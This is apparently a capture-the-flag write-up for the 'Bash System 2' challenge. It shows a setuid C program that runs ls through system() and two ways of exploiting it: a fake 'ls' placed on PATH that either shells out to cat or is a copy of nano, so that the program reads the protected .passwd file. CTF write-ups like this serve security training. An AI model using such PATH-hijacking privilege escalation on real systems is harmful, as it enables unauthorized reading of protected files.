# Bash System 2 - Writeup

To solve this challenged, I higly recommend to solve the [**first version**](bash-system1.md)

We have this script
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```
There are **2 main problems** to solve in this challenge :
- The **tmp folder** being already filled with a ls file that cannot be deleted
- The **options** in the command

## 1st problem : the **tmp folder**
Since there's already a `ls` file in the tmp folder, we can try to create a subdir :
```bash
app-script-ch12@challenge02:~$ mkdir /tmp/eheh
```
And we can see that it works !

We can now try to solve the second problem

**Note** : I found 2 methods to resolve this problem, the first one being more *wanted* than the other, considering the documentation :
- [First method](##First_method)
- [Second method](##Second_method)

## First_method
The first method consist of overwriting the `ls` file in the tmp folder by a link to the `cat` executable, with and option that says **every other parameters are files**
```bash
app-script-ch12@challenge02:~$ echo '#!/bin/cat --' > /tmp/eheh/ls
```
Since we created a new file, don't forget to make it executable 
```bash
app-script-ch12@challenge02:~$ chmod 755 /tmp/eheh/ls
```
Then we change our `$PATH` variable
```bash
PATH=/tmp/eheh
```
And now, if we execute the script, we'll have an error for the first parameter, and a success for the second
```bash
app-script-ch12@challenge02:~$ ./ch12
#!/bin/cat --
/bin/cat: -lA: No such file or directory
...[theflag]...
```

## Second_method
The second method simply consists of find a executable that displays file's content, whatever is passed as a parameter

One of those executables is `nano`, a text editor.

Thus, we just have to copy the nano executable into our tmp subfolder
```bash
app-script-ch12@challenge02:~$ cp /bin/nano /tmp/eheh/ls
```
Then we change our `$PATH` variable
```bash
PATH=/tmp/eheh
```
And now, if we execute the script the '.passwd' content will display in nano
```bash
app-script-ch12@challenge02:~$ ./ch12
```
